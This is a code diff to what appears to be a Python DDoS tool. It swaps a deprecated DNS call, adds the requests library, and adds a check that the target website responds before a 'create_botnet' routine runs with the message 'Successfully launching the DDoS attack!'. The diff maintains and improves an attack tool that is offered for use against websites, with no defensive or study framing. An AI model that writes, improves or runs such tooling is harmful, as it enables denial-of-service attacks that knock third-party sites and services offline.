@@ -2,6 +2,7 @@ import socket
 import threading
 import random
 import dns.resolver
+import requests
 import time
 
 banner = """
@@ -40,7 +41,7 @@ with open("cazzy.txt", "r") as file:
 
 def get_ip_addresses(url):
     try:
-        answers = dns.resolver.query(url, 'A')
+        answers = dns.resolver.resolve(url, 'A')
         ip_addresses = [str(rdata) for rdata in answers]
         return ip_addresses
     except:
@@ -270,14 +271,20 @@ def create_botnet():
         thread.start()
 
 def check_website(url):
+    if not url.startswith("http://") and not url.startswith("https://"):
+        url = "http://" + url
+
     try:
-        answers = dns.resolver.resolve(url, 'A')
-        print("Valid URL")
-        print("Loading...")
-        time.sleep(5)
-        print("Successfully launching the DDoS attack!")
-        create_botnet()
-        print("Botnet created!")
+        response = requests.get(url)
+        if response.status_code >= 200 and response.status_code < 300:
+            print("Valid URL")
+            print("Loading...")
+            time.sleep(5)
+            print("Successfully launching the DDoS attack!")
+            create_botnet()
+            print("Botnet created!")
+        else:
+            print("Sorry, the website URL is not valid.")
     except:
         print("Sorry, the website URL is not valid.")
 
